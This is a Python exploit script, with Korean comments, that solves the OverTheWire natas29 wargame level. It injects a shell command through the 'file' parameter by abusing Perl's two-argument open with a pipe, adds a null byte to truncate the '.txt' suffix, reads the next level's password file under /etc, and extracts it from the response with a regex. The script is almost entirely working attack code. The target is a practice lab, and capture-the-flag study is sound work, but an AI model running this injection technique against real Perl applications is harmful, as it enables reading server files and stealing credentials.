import requests
import sys
import re

boundary = "=" * 65 

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 아래 실행 포멧 필수")
  print(f"   natas29.py {sys.argv[0]} [natas29 비밀번호]")
  print(boundary)
  sys.exit()
  
s = requests.Session()
natas29_cred = sys.argv[1]

url = "http://natas29.natas.labs.overthewire.org/index.pl/"
s.auth = ("natas29", natas29_cred)

# Perl 2-arg open 취약점 이용해서 |를 통해서 원하는 os 명령어를 실행
# \00(널바이트)를 삽입하여 .txt 확장자가 붙지않도록 방지(fileupload 우회와 유사)  
payload = {"file": "| cat /etc/na*/na*30 \00"}

response = s.get(url, params=payload)

# 실제 정규식을 저렇게 하면 응답화면에 natas29 비밀번호도 수집해서 오기 때문에, banlist로 넣고 비밀번호에 수집되지 않도록 함.
no_search = [natas29_cred]
password = re.findall(r"[a-zA-Z0-9]{32}", response.text)
password = [pw for pw in password if pw not in no_search]

print(boundary)
print(f"[+] 요청한 페이로드 전체 url확인: {response.url}")
print(boundary)

if password:
  print(f"[+] natas30의 비밀번호 ===> {password[0]}")
  print(boundary)
else:
  print("[-] 원하는대로 익스플로잇 안됨, 응답전체 확인")
  print(response.text)
  print(boundary)


